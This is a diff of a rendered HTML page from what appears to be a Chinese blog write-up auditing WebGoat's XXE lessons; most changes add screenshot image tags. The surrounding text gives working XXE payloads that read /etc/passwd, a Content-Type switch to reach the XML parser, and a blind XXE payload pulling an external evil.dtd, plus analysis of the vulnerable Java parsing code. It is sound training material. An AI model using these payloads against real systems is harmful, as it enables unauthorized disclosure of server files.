@@ -297,28 +297,28 @@
 <h2 id="0x02-靶场"><a href="#0x02-靶场" class="headerlink" title="0x02 靶场"></a>0x02 靶场</h2><h3 id="1-提一嘴的-PageLesson3"><a href="#1-提一嘴的-PageLesson3" class="headerlink" title="1. 提一嘴的 PageLesson3"></a>1. 提一嘴的 PageLesson3</h3><p>可以去看一眼，理解一下 DTD。而且这一页给我们提供了一个 XXE 例子。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;utf-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">author</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">js</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">author</span>&gt;</span><span class="symbol">&amp;js;</span><span class="tag">&lt;/<span class="name">author</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/etc_password.png" class>
 
 <h3 id="2-XXE-PageLesson4-利用-file-协议读出敏感数据"><a href="#2-XXE-PageLesson4-利用-file-协议读出敏感数据" class="headerlink" title="2. XXE PageLesson4 利用 file 协议读出敏感数据"></a>2. XXE PageLesson4 利用 file 协议读出敏感数据</h3><ul>
 <li>靶场题意：让我们通过对 index 下的图片添加评论，从而触发 XXE，导致列出文件系统的根目录。</li>
 </ul>
 <h4 id="题目部分"><a href="#题目部分" class="headerlink" title="题目部分"></a>题目部分</h4><p>靶场如图所示</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileIndex.png" class>
 
 <p>我们在评论区内输入 123，并用 Burpsuite 抓包。抓包之后发现，请求的地址是 &#x2F;WebGoat&#x2F;xxe&#x2F;simple，POST 请求的正文是一个标准格式的 XML。</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  </span><br><span class="line">	<span class="tag">&lt;<span class="name">text</span>&gt;</span>123<span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileXXE.png" class>
 
 <p>既然这边的 XML 可以通过用户的输入进行自定义，所以我们构造如下的 payload：</p>
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&#x27;1.0&#x27;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">any</span>[<span class="meta">&lt;!ENTITY <span class="keyword">test</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span>]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">text</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/SuccessFileXXE.png" class>
 
 <p>在JAVA中，file:&#x2F;&#x2F;协议不仅可以读取文件，还可以列目录。</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/SuccessFileXXE2.png" class>
 <h4 id="源码部分"><a href="#源码部分" class="headerlink" title="源码部分"></a>源码部分</h4><p>前文我们说了，发包的时候请求的地址是 &#x2F;WebGoat&#x2F;XXE&#x2F;SimpleXXE，我们去翻这个源文件。</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileXXECode.png" class>
 
 <p>最让人想看到的 <code>return success(this).build()</code> 在第 73 - 75 行。</p>
 <ul>
@@ -328,7 +328,7 @@
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">comment</span> <span class="operator">=</span> comments.parseXml(commentStr);  </span><br><span class="line">comments.addComment(comment, <span class="literal">false</span>);</span><br></pre></td></tr></table></figure>
 
 <p>跳转到 <code>Comments.parseXml</code> 去，主要描述了 parseXml 如何处理 commentStr。</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/FileXXECommentCode.png" class>
 
 <p>第 93 - 94 行单独拉出来讲</p>
 <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">jc</span> <span class="operator">=</span> JAXBContext.newInstance(Comment.class);  </span><br><span class="line"><span class="type">var</span> <span class="variable">xif</span> <span class="operator">=</span> XMLInputFactory.newInstance();</span><br></pre></td></tr></table></figure>
@@ -344,7 +344,7 @@
 </ul>
 <p>JAXBContext.newInstance(Comment.class) 的作用是将 Comment 这个对象进行注册，创建一个 JAXB 实例；实例名字在本代码中为 jc。</p>
 <p>Comment 对象如图所示</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/CommentCode.png" class>
 
 
 <blockquote>
@@ -367,16 +367,16 @@
 <li>题意：发包的 Body 修改成了 json 的格式，看上去不存在 XXE 了</li>
 </ul>
 <h4 id="题目部分-1"><a href="#题目部分-1" class="headerlink" title="题目部分"></a>题目部分</h4><p>靶场和上一题长得一模一样，甚至上一题渗透的痕迹还在。</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeIndex.png" class>
 
 <p>抓个包，查看一下；发现是 Content-Type 变为 json</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeBag.png" class>
 
 <p>尝试修改 Content-Type 为 application&#x2F;xml 再发包，并使用上一题的 payload</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeSolved.png" class>
 
 <h4 id="源码部分-1"><a href="#源码部分-1" class="headerlink" title="源码部分"></a>源码部分</h4><p>ContentTypeAssignment.java 文件下的 xxe&#x2F;content-type 接口。</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/ContenTypeCode.png" class>
 
 
 <p>源码部分，并没有对 Content-Type 进行严格的过滤。</p>
@@ -395,12 +395,12 @@
 <figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">convert</span> [ </span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;http://localhost:9090/files/admin1123这里是自己的username/evil.dtd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">%remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">comment</span>&gt;</span>  <span class="tag">&lt;<span class="name">text</span>&gt;</span>123 <span class="symbol">&amp;secret;</span><span class="tag">&lt;/<span class="name">text</span>&gt;</span><span class="tag">&lt;/<span class="name">comment</span>&gt;</span></span><br></pre></td></tr></table></figure>
 
 <p>在 Burpsuite 中发包，接着刷新再输入即可。</p>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/Solved.png" class>
 
 <h4 id="源码部分-2"><a href="#源码部分-2" class="headerlink" title="源码部分"></a>源码部分</h4><ul>
 <li>源码层面和之前是一样的，只是没有回显的消息了，我这里把有回显与无回显的都贴出来对比一下。</li>
 </ul>
-
+<img src="/2022/04/18/WebGoat%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-05-XXE%E6%B3%A8%E5%85%A5/Diff.png" class>
             </div>
 
             
